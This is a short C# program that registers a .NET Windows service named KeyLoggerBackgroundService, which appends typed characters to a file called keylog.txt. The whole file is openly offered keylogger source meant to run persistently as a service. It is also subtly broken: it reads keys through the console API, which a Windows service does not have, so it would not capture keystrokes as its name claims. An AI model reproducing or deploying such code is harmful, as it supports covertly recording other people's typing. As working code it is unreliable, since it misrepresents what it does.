using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging;
using System.IO;
using System.Threading;
using System.Threading.Tasks;

var builder = Host.CreateApplicationBuilder(args);

builder.Services.AddWindowsService();
builder.Services.AddHostedService<KeyLoggerBackgroundService>();

builder.Build().Run();

public class KeyLoggerBackgroundService : BackgroundService
{
    private readonly ILogger<KeyLoggerBackgroundService> _logger;
    private readonly IHostApplicationLifetime _hostApplicationLifetime;

    public KeyLoggerBackgroundService(
        ILogger<KeyLoggerBackgroundService> logger,
        IHostApplicationLifetime hostApplicationLifetime)
    {
        _logger = logger;
        _hostApplicationLifetime = hostApplicationLifetime;
    }

    protected override async Task ExecuteAsync(CancellationToken stoppingToken)
    {
        using (StreamWriter sw = new StreamWriter("keylog.txt", true))
        {
            while (!stoppingToken.IsCancellationRequested)
            {
                if (Console.KeyAvailable)
                {
                    var keyInfo = Console.ReadKey(true);
                    if (keyInfo.Key == ConsoleKey.Escape)
                        break;
                    sw.Write(keyInfo.KeyChar);
                    sw.Flush();
                }
                await Task.Delay(50, stoppingToken);
            }
        }
    }
}


